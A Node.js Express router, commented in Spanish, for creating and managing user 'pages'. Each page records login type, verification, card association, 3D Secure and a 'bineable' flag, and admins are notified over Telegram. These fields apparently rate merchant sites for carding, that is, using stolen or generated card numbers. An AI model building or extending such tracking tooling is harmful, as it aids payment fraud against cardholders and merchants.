const express = require('express');
const router = express.Router();
const { authenticate, requireRole } = require('../middleware/auth');
const UserPage = require('../models/UserPage');
const { sendSafeMessage } = require('../bot_telegram');
const { pool } = require('../database');

// Todas las rutas requieren autenticación
router.use(authenticate);

// Obtener todas las páginas personales del usuario
router.get('/', async (req, res) => {
    try {
        const pages = await UserPage.getUserPages(req.user.id);
        res.json({ success: true, pages });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Crear una nueva página personal (cualquier usuario)
router.post('/', async (req, res) => {
    try {
        const { name, login_type, verification, allow_card_association, has_3d, is_bineable, responses } = req.body;
        if (!name) return res.status(400).json({ success: false, error: 'Nombre de página requerido' });
        
        // Verificar que no exista una página global con el mismo nombre (opcional)
        const globalExists = await pool.query('SELECT id FROM pages WHERE name = $1', [name]);
        if (globalExists.rows.length > 0) {
            return res.status(400).json({ success: false, error: 'Ya existe una página global con ese nombre' });
        }
        
        const page = await UserPage.create(req.user.id, {
            name, login_type, verification, allow_card_association, has_3d, is_bineable, responses
        });
        
        // Notificar al admin (si hay admin configurado)
        const adminUsers = await pool.query(`SELECT telegram_chat_id FROM users WHERE role = 'admin' AND telegram_chat_id IS NOT NULL`);
        const adminChatIds = adminUsers.rows.map(row => row.telegram_chat_id);
        for (const chatId of adminChatIds) {
            await sendSafeMessage(chatId, 
                `🆕 *Nueva página personal creada*\n\n` +
                `👤 Usuario: @${req.user.username} (ID: ${req.user.id})\n` +
                `📄 Página: ${name}\n` +
                `🔐 Login: ${login_type}\n` +
                `✅ Verificación: ${verification}\n` +
                `💳 Asociar tarjetas: ${allow_card_association ? 'Sí' : 'No'}\n` +
                `🔒 3D Secure: ${has_3d ? 'Sí' : 'No'}\n` +
                `🧩 Bineable: ${is_bineable ? 'Sí' : 'No'}\n` +
                `📝 Respuestas: ${responses?.length || 0}\n\n` +
                `Puedes revisar la página personal en el panel de administración.`,
                { parse_mode: 'Markdown' }
            );
        }
        
        res.json({ success: true, page, message: 'Página personal creada exitosamente' });
    } catch (error) {
        console.error('Error creando página personal:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Actualizar página personal
router.put('/:id', async (req, res) => {
    try {
        const pageId = parseInt(req.params.id);
        const { name, login_type, verification, allow_card_association, has_3d, is_bineable, responses } = req.body;
        const updated = await UserPage.update(pageId, req.user.id, {
            name, login_type, verification, allow_card_association, has_3d, is_bineable, responses
        });
        res.json({ success: true, page: updated });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Eliminar página personal
router.delete('/:id', async (req, res) => {
    try {
        const pageId = parseInt(req.params.id);
        const deleted = await UserPage.delete(pageId, req.user.id);
        if (!deleted) return res.status(404).json({ success: false, error: 'Página no encontrada' });
        res.json({ success: true, message: 'Página eliminada' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});

module.exports = router;